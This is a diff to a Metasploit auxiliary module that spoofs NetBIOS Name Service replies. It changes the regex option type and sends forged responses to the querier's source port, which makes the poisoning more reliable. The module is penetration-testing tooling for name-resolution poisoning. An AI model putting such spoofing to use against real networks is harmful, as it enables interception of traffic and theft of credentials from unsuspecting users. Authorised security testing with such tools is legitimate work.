@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options([
       OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", "127.0.0.1"]),
-      OptString.new('REGEX', [ true, "Regex applied to the NB Name to determine if spoofed reply is sent", '.*']),
+      OptRegexp.new('REGEX', [ true, "Regex applied to the NB Name to determine if spoofed reply is sent", '.*']),
     ])
 
     register_advanced_options([
@@ -67,9 +67,9 @@ class Metasploit3 < Msf::Auxiliary
 
     while @run # Not exactly thrilled we can never turn this off XXX fix this sometime.
       packet, addr = @sock.recvfrom(512)
-      vprint_status("Packet Received from #{addr[3]}")
-
+      src_port = addr[1]
       rhost = addr[3]
+
       break if packet.length == 0
 
       nbnsq_transid      = packet[0..1]
@@ -89,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
 
       if (nbnsq_decodedname =~ /#{datastore['REGEX']}/i)
 
-        vprint_status("Regex matched #{nbnsq_decodedname} from #{rhost}. Sending reply...")
+        vprint_good("#{rhost.ljust 16} nbns - #{nbnsq_decodedname} matches regex, responding with #{datastore["SPOOFIP"]}")
 
         if datastore['DEBUG']
           print_status("transid:        #{nbnsq_transid.unpack('H4')}")
@@ -128,7 +128,7 @@ class Metasploit3 < Msf::Auxiliary
         p.ip_daddr = rhost
         p.ip_ttl = 255
         p.udp_sport = 137
-        p.udp_dport = 137
+        p.udp_dport = src_port
         p.payload = response
         p.recalc
 
@@ -137,7 +137,7 @@ class Metasploit3 < Msf::Auxiliary
         close_pcap
 
       else
-        vprint_status("Packet received from #{rhost} with name #{nbnsq_decodedname} did not match regex")
+        vprint_status("#{rhost.ljust 16} nbns - #{nbnsq_decodedname} did not match regex")
       end
     end
 
